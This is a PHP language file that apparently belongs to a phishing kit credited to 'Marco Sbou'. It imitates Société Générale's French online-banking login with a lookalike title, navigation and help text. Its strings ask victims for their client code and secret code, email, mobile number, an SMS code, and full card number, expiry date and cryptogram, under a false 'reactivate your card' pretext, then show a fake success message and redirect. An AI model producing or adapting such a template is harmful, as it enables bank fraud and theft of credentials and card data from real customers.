<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-++ Author Name      : ANƬƖ-M̷A̷R̷C̷O̷  S̷B̷O̷U̷ 
* [M][A][R][C][O] [S][B][O][U] Template Name    : [м][α][я][c][σ] [s][в][σ][υ]
* +-+-+-+-+-+-+-+-+-+-+-+-+-++ Template Version : V.1.1 By 🄼🄰🅁🄲🄾 🅂🄱🄾🅄 
===========================================================================*/
error_reporting(E_ALL);

function lang($phrase){
	static $lang = array(
		/* Main Page */
		'pg1_title'   => 'Société Générale | Connexion', 								/* title pg 1  */
        'pg2_title'  => 'Informations personnelles', 								/* title pg 2  */
        /* == head pg 1 == */
		'xmo1_sp'  => 'Agences', 	                                         /* tink button header top   */
        'xmo2_sp'   => 'Aide et contacts', 	                        /* tnk 2 button header top  */
        /* == head phone ==*/
		'xmo3_sp' => 'Connexion - Espace client',                    /* title h1 phone */
        'xmo4_lb_pu1'    => 'Saisissez votre code client',	 	/* input label page 1 identifiant  */
        'xmo5_msg_er1'  => 'Votre identifiant est incorrect',		  						        /* msg error input identifiant  */
        'xmo5_msg_er2'  => 'Veuillez vérifier votre identifiant et votre code confidentiel.',		  						        /* msg error input identifiant password */
        'xmo6_valider'  => 'Valider',					/* button valider */
        'xmo7_voice'  => 'Activer le clavier sonore',		  								/* link voice  */
        /* == page 1 all text right */
		'xmo8_sp_rt' => 'Obtenir vos codes',		/* text right page 1 1 */
		'xmo9_sp_rt' => 'Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d\'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.',						/* text right page 1 span 2 */
		'xmo10_sp_rt' => 'Code secret oublié',									/* text right page 1 3 */
		'xmo11_sp_rt' => 'Effectuer une nouvelle demande',			  /* text right page 1 4 */
		'xmo12_sp_rt' => 'Urgences carte bancaire',							/* text right page 1 5 */
		'xmo13_sp_rt' => 'Faire opposition à votre carte bancaire',					/* text right page 1 6 */
		'xmo14_sp_rt' => 'Verrouiller votre carte bancaire',											/* text right page 1 7 */
		'xmo15_sp_rt' => 'Nos conseils sécurité',	/* text right page 1 8 */
		'xmo16_sp_rt' => 'Découvrez le Pass sécurité',						/* text right page 1 9 */
		'xmo17_sp_rt' => 'Voir les menaces identifiées',			/* text right page 1 10 */
        'xmo18_sp_rt' => 'Guide des bonnes pratiques',	/* text right page 1 11 */

        /* ==== footer ==== */
        
		'xmo_foot1' => 'Trouver une agence.',		/* nav 1 footer list 1  */
		'xmo_foot2' => 'Questions fréquentes',					/* nav 1 footer list 2  */
		'xmo_foot3' => 'Autres sites Société Générale',								/* nav 1 footer list 3  */
		'xmo_foot_nav1' => 'Tarifs',	/* footer nav bottem 1 */
		'xmo_foot_nav2' => 'Nos engagements',									/* footer nav bottem 2 */
		'xmo_foot_nav3' => 'Informations légales',						/* footer nav bottem 3 */
		'xmo_foot_nav4' => 'Charte Cookies',		/* footer nav bottem 4 */
		'xmo_foot_nav5' => 'Sécurité',						/* footer nav bottem 5 */
        'xmo_foot_nav6' => 'Données personnelles',								/* footer nav bottem 6 */
        
        /* ==== page 2 ======*/
		'xmo_pg2_txt1' => 'Vos coordonnées ont été mises a jour avec succès!',									/* code recu ... */
		'xmo_pg2_txt2' => 'Félicitations!',   /* mobile */
		'xmo_pg2_txt3' => 'veuillez patienter vous allez être redirigé automatiquement...',  /* Exmple*/
        'xmo_pg2_txt4' => 'déconnexion',
        
        /* nav pag 2 center */
        'xmo_pg2_nav1' => 'Comptes et cartes',
        'xmo_pg2_nav2' => 'Emprunter',
        'xmo_pg2_nav3' => 'Épargner',
        'xmo_pg2_nav4' => 'Assurer',
        'xmo_pg2_nav5' => 'Nos conseils',
        'xmo_pg2_nav6' => 'Autres',

		'xmo_pg2_txt5' => 'Gardons le contact',
		'xmo_pg2_txt6' => 'Dans cette période de crise, pour vous informer régulièrement et vous accompagner au mieux au quotidien, nous souhaitons recueillir votre adresse e-mail.',
		'xmo_pg2_txt7' => 'Vous serez également informé de toutes nos actualités, des évolutions réglementaires et des offres promotionnelles susceptibles de vous intéresser.',
		'xmo_pg2_txt8' => 'Saisissez votre adresse e-mail',
		'xmo_pg2_txt9' => 'Une adresse e-mail à jour est nécessaire pour s\'assurer de recevoir toutes nos communications. Nous vous invitons donc à la renseigner ou la modifier si nécessaire.',
        'xmo_pg2_txt10' => 'Si vous ne souhaitez plus recevoir nos communications sur votre adresse e-mail personnelle, vous pouvez à tout moment modifier vos préférences dans Autres > Mon profil >',
        'xmo_pg2_txt11' => 'Personnaliser vos canaux de communication commerciale.',
        'xmo_pg2_txt12' => 'Numéro de téléphone mobile de sécurité',
        'xmo_pg2_txt13' => 'Elle est indispensable pour la protection de vos comptes et contrats. Pour vous informer régulièrement et vous accompagner au mieux et au quotidien, nous souhaitons recueillir votre numéro de téléphone mobile de sécurité',
        'xmo_pg2_txt14' => 'Saisissez votre numéro de téléphone .10 Chiffres',
        'xmo_pg2_txt15' => 'Si vous ne souhaitez plus recevoir nos communications sur votre numéro de téléphone sécurité, vous pouvez à tout moment modifier vos préférences dans Autres > Mon profil >',
        'xmo_pg2_txt16' => 'Moyens de sécurité : code secret, numéro de téléphone sécurité et Pass Sécurité.',
        'xmo_pg2_txt17' => 'Numéro de téléphone sécurité',
        'xmo_pg2_txt18' => 'Un Code sera envoyé au numéro de téléphone:',
        'xmo_pg2_txt19' => 'Vous pouvez changer le numéro de téléphone',
        'xmo_pg2_txt20' => 'En cliquant sur Modifier',
        'xmo_pg2_txt21' => 'Modifier',
        'xmo_pg2_txt22' => 'Veuillez saisir le code recu par sms',
        'xmo_pg2_txt23' => 'Saisissez le code recu par sms',
        'xmo_pg2_txt24' => 'Gestion des donnéés personnelles',
        'xmo_pg2_txt25' => 'Vos coordonnées ont été mises a jour avec succès!',
        'xmo_pg2_txt_cc' => 'veuillez réactiver votre carte bancaire pour vos achats et retrait',
        'xmo_pg3_put_cc' => 'N° de la carte bancaire(16) chiffre.',
        'xmo_pg3_put_date' => 'Date d\'expiration',
        'xmo_pg3_put_xc' => 'Cryptogramme'
	);	
	return $lang[$phrase];
}

//		 | ' | = &apos;
